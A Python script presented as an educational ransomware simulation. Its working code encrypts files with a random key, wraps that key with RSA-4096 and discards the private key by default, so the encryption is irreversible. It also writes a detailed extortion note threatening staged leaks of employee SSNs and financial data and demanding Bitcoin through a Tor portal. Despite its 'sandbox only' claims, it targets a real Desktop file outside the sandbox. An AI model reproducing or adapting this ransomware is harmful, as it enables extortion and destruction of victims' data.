"""
Fox Ransomware Simulation - EDUCATIONAL USE ONLY
Demonstrates hybrid encryption ransomware on a SANDBOX folder.
Learn with it. Do not point it at anything you didn't create.
"""
import os
import ctypes
from pathlib import Path
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization

# ---------------------------------------------------------------
# CONFIG: choose ONE specific file to encrypt (safe mode)
# If TARGET_FILE is None, the script uses the sandbox folder.
# ---------------------------------------------------------------
TARGET_FILE = Path.home() / "OneDrive" / "Desktop" / "my_test_file.txt"


# ---------------------------------------------------------------
# CONFIG: everything happens inside this sandbox folder only.
# ---------------------------------------------------------------
SANDBOX = Path("C:/Users/Me/OneDrive/Desktop/fox_sandbox")
SKIP = {".py", ".pem", ".key"}          # never encrypt our own keys/scripts
EXTS = {".txt", ".docx", ".pdf", ".jpg", ".png", ".mp3", ".mp4", ".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx", ".pptx",
    ".jpg", ".png", ".mp4", ".mp3",
    ".zip", ".iso",
    ".sql", ".mdb", ".db",
    ".json", ".xml", ".cfg", ".ini"}

def get_files():
    """Return either a single target file or all sandbox files."""
    if TARGET_FILE is not None:
        p = Path(TARGET_FILE)
        if p.exists() and p.is_file() and p.suffix.lower() in EXTS:
            return [p]
        else:
            print(f"[!] TARGET_FILE invalid or unsupported: {p}")
            return []
    else:
        # original sandbox behavior
        # return [
        #     p for p in SANDBOX.rglob("*")
        #     if p.is_file() and p.suffix.lower() in EXTS
        # ]
        return []


NOTE = """\
=====================================================================
                    W H O   I S   F . F . S . ?
=====================================================================

                      ,.
                     /   `.
                    ( o.o )    FLUFFY FOX SYNDICATE
                     > ^ <     Operations Unit "DEN"

    FFS -ransomware-as-a-service- private build 4.2.1
    SHA-256 of this build: 7f3a...do not bother verifying it.

=====================================================================
                        WHAT HAPPENED?
=====================================================================

Corporate systems of YOUR-COMPANY have been COMPLETELY encrypted.
Filesystems on every domain-joined endpoint and server were locked
using Salsa20 with a 256-bit session key. The session key was then
encrypted with RSA-4096 - the private half DOES NOT EXIST anywhere
on your network. We removed it. We are the only holders.

The following was ALSO exfiltrated BEFORE encryption began:

  - Accounting: 41 GB (QuickBooks, payroll, bank reconciliations)
  - HR: personnel files incl. SSNs, home addresses, medical notes
  - Engineering: unreleased product schematics and source code
  - Backups: yes, we found them. All of them. They are gone.

The archive is 187 GB. It is currently in a private location.

=====================================================================
              WHAT HAPPENS IF YOU DO NOT PAY?
=====================================================================

STAGE 1 - 72 hours from infection:
  Sample data (HR folder, 900 employee records) is published on our
  leak blog and pushed to every cybersecurity journalist on our list.

STAGE 2 - 7 days from infection:
  Full 187 GB archive goes public. Competitors, clients, regulators
  and journalists get simultaneous access.

STAGE 3 - 30 days from infection:
  Archive is sold to the highest bidder on grey markets. Given the
  SSNs and bank data inside, expect targeted fraud against every
  employee for years. This is the worst outcome for you, and we
  tell you this only because we want our money, not your lives.

=====================================================================
                        HOW TO RECOVER
=====================================================================

1. Install Tor Browser:  https://torproject.org
2. Open our NEGOTIATION PORTAL (Tor only):

       http://f0xsynd1cat3n7g[REDACTED].onion

3. Sign in with YOUR unique ID - this is your receipt, do not lose it:

       FFS-9F7A-3B2C-DEAD-BEEF-8842

4. You will chat with a negotiator. Automated replies do not work.
   We are awake. We do not sleep.

=====================================================================
                        PRICE & TERMS
=====================================================================

   Current price ........ 0.45 BTC  (~$49,900 at current rates)

   - Pay within 72 hours:  price drops to 0.29 BTC (~$29,900)
   - Pay within 7 days:    price stays at 0.45 BTC
   - After 7 days:         price DOUBLES every week thereafter
   - After 30 days:        no deal. See Stage 3 above.

   We accept ONLY Bitcoin. Wallet address is generated per
   negotiation session on the portal. Do not send funds before a
   negotiator confirms the address in chat - addresses outside
   chat are fake, and you will lose everything /"""


def drop_ransom_note():
    note = SANDBOX / "README_FOXED.txt"
    """note.write_text(
        "==================================================\n"
        "           *** YOUR FILES ARE ENCRYPTED ***\n"
        "                FLUFFY FOX SYNDICATE\n"
        "==================================================\n\n"
        "Your files are encrypted with AES-256. The key was\n"
        "wrapped with RSA-4096 and removed from this machine.\n\n"
        "To recover: pay 999 SnackCoin, then run:\n\n"
        "    python foxed_decryptor.py private_key.pem\n\n"
        "Do NOT rename .f0x3d files.\n"
        "Do NOT reboot. (We're joking. Reboot freely.)\n\n"
        "        /\\   /\\\n"
        "       ( o.o )   \"boop\"\n"
        "        > ^ <\n"
    )"""
    note.write_text(NOTE)

def set_wallpaper(img_path):
    """Windows-only wallpaper change - the visual scare."""
    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, str(img_path), 3)
    except Exception:
        pass  # non-Windows / no permission, ignore

def main():
    SANDBOX.mkdir(exist_ok=True)

    # --- 1. RSA-4096 keypair (the "attacker keeps this" key) ---
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=4096)
    public_key = private_key.public_key()
    (SANDBOX / "public_key.pem").write_bytes(
        public_key.public_bytes(
            serialization.Encoding.PEM,
            serialization.PublicFormat.SubjectPublicKeyInfo))
    # NOTE: the private key is NOT saved here on purpose --
    # that's the whole point. The victim can't decrypt without it.
    # Your teacher/you keeps it: uncomment to save locally for the lab:
    # (SANDBOX / "private_key.pem").write_bytes(private_key.private_bytes(
    #     serialization.Encoding.PEM,
    #     serialization.PrivateFormat.PKCS8,
    #     encryption_algorithm=serialization.NoEncryption()))

    # --- 2. Random AES key (the actual file-encryption key) ---
    aes_key = Fernet.generate_key()

    # --- 3. Encrypt every target file ---
    files = get_files()
    for path in files:
        try:
            data = path.read_bytes()
        except (PermissionError, OSError):
            continue
        enc = Fernet(aes_key).encrypt(data)
        path.write_bytes(enc)
        path.rename(path.with_suffix(path.suffix + ".f0x3d"))

    # --- 4. Wrap the AES key with the RSA public key ---
    wrapped = public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    (SANDBOX / "key.key").write_bytes(wrapped)  # useless without private key

    # --- 5. Psychological payload ---
    drop_ransom_note()
    # set_wallpaper("fox_warning.png")   # make a 1920x1080 warning image first
    print(f"Foxed {len(files)} files in {SANDBOX}")
    print("Sandbox is now 'infected'. Run foxed_decryptor.py to restore.")

if __name__ == "__main__":
    main()